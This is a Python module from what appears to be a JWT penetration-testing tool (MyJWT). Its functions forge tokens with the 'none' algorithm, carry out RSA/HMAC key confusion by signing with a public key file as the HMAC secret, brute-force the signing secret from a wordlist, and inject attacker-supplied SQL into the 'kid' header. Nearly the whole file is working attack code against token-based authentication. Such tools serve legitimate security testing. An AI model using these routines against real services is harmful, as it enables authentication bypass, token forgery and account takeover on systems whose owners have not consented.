import click
from MyJWT.Exception import InvalidJWT
from MyJWT.modifyJWT import changeAlg, signature
from MyJWT.utils import jwtToJson, encodeJwt, isValidJwt, HEADER


def noneVulnerability(jwt):
    """
    Check none Vulnerability.

    :param str jwt: your jwt
    :return: new jwt
    :rtype: str

    :raise InvalidJWT: if your jwt is not valid
    """
    if not isValidJwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwtJson = changeAlg(jwtToJson(jwt), "none")
    return encodeJwt(jwtJson) + "."


def confusionRsaHmac(jwt, filename):
    """
    Check rsa/hmac confusion.

    :param str jwt: your jwt
    :param str filename: path file
    :return: new jwt
    :rtype: str

    :raise InvalidJWT: if your jwt is not valid
    """
    if not isValidJwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwtJson = changeAlg(jwtToJson(jwt), "HS256")
    return signature(jwtJson, open(filename).read())


def bruteforceDict(jwt, fileName):
    """
    Crack your jwt

    :param str jwt: your jwt
    :param str fileName: path file
    :return: key cracked or "" if key not found
    :rtype: str

    :raise InvalidJWT: if your jwt is not valid
    """
    if not isValidJwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwtJson = jwtToJson(jwt)
    with open(fileName, 'r') as file:
        allPassword = [line.rstrip() for line in file]
    file.close()
    for password in allPassword:
        newJwt = signature(jwtJson, password)
        newSig = newJwt.split('.')[2]
        if newSig == jwt.split('.')[2]:
            return password
    return ""


def injectSqlKid(jwt, injection):
    """
    Inject sql to your jwt

    :param str jwt: your jwt
    :param str injection: your injection
    :return: new jwt
    :rtype: str

    :raise InvalidJWT: if your jwt is not valid
    """
    if not isValidJwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwtJson = jwtToJson(jwt)
    jwtJson[HEADER]["kid"] = injection
    return signature(jwtJson, "")


def printDecoded(jwt):
    """
    Print your jwt.

    :param str jwt: your jwt
    :return:
    """
    if not isValidJwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwtJson = jwtToJson(jwt)
    click.echo(f"Header: {jwtJson['header']}")
    click.echo(f"Payload: {jwtJson['payload']}")
    click.echo(f"Signature: {jwtJson['signature']}")
